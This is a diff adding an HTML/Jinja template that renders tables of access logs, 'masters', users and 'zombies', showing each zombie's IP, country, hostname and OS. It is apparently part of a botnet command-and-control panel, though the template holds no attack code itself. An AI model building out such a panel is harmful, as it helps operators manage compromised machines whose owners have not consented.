@@ -1,0 +1,107 @@
+
+{% block table %}
+
+
+{% if scrollable_table %}
+  {% if table_class or height or min_width or max_height %}
+    <div class="scroll-table {% if table_class %}{{ table_class }}{% endif %}"
+         style="{% if min_width %}min-width: {{ min_width }};{% endif %}
+                {% if max_height %}max-height: {{ max_height }};{% endif %}
+                {% if height %}height: {{ height }};{% endif %}">
+  {% else %}
+    <div class="scroll-table">
+  {% endif %}
+{% endif %}
+
+<table class="darkTable" id="table-results-{{ data_type }}">
+  <thead>
+  <tr>
+    {% if data_type != 'masters' %}
+      <th><input type="checkbox" class="tab-checkbox" onClick="toggle_checkall(this, 'tab-checkbox check-{{ data_type }}'); toggle_enabled_by_any('data-buttons-{{ data_type }}', 'tab-checkbox check-{{ data_type }}')" /></th>
+    {% endif %}
+
+    <!--<th>id</th>-->
+
+    {% if data_type == 'access-logs' %}
+      {% include 'objects/tables/headers/access-logs.html' %}
+
+    {% elif data_type == 'masters' %}
+      {% include 'objects/tables/headers/masters.html' %}
+
+    {% elif data_type == 'users' %}
+      {% include 'objects/tables/headers/users.html' %}
+
+    {% elif data_type == 'zombies' %}
+      {% include 'objects/tables/headers/zombies.html' %}
+    {% endif %}
+
+  </tr>
+  </thead>
+
+  <tbody>
+
+  {% for row in data %}
+  <tr>
+    {% if data_type != 'masters' %}
+      <td><input type="checkbox" class="tab-checkbox check-{{ data_type }}" id="{{ row['id'] }}" name="{{ data_type }}_checked" value="{% if data_type == 'access-logs' %}{{ row['id'] }}{% else %}{{ row['username'] }}{% endif %}" onclick="toggle_enabled_by_any('data-buttons-{{ data_type }}', 'tab-checkbox check-{{ data_type }}')" /></td>
+    {% endif %}
+
+    {% if data_type == 'access-logs' %}
+      {% include 'objects/tables/columns/access-logs.html' %}
+
+    {% elif data_type == 'masters' %}
+      <td>{{ row['username'] }}</td>
+
+    {% elif data_type == 'users' %}
+      <td>{{ row['username'] }}</td>
+      <td>{{ row['public_ip'] }}</td>
+      <td>
+        <span class="flag-icon">
+        {% with country_code=row['country'].upper() %}
+          {% include 'objects/dynamic/cc_flag.html' %}
+        {% endwith %}
+        </span>
+        {% if not brief %}
+          {{ row['country'] }}
+        {% endif %}
+      </td>
+      {% if not brief %}
+        <td>{{ row['registered_at'] }}</td>
+      {% endif %}
+
+    {% elif data_type == 'zombies' %}
+      <td>{{ row['username'] }}</td>
+      <td>{{ row['current_public_ip'] }}</td>
+      <td>
+        <span class="flag-icon">
+        {% with country_code=row['current_country'].upper() %}
+          {% include 'objects/dynamic/cc_flag.html' %}
+        {% endwith %}
+        </span>
+        {% if not brief %}
+          {{ row['current_country'] }}
+        {% endif %}
+      </td>
+      {% if not brief %}
+        <td>{{ row['current_hostname'] }}</td>
+        <td>
+          {% with os=row['os'].lower() %}
+            {% include 'objects/dynamic/os_icon.html' %}
+          {% endwith %}
+<!--          {{ row['os'] }}-->
+        </td>
+        <td>{{ row['registered_at'] }}</td>
+      {% endif %}
+    {% endif %}
+
+  </tr>
+  {% endfor %}
+
+  </tbody>
+</table>
+
+{% if scrollable_table %}</div>{% endif %}
+
+<script src="{{ url_for('static', filename='js/table-resizable.js') }}"></script>
+
+{% endblock %}
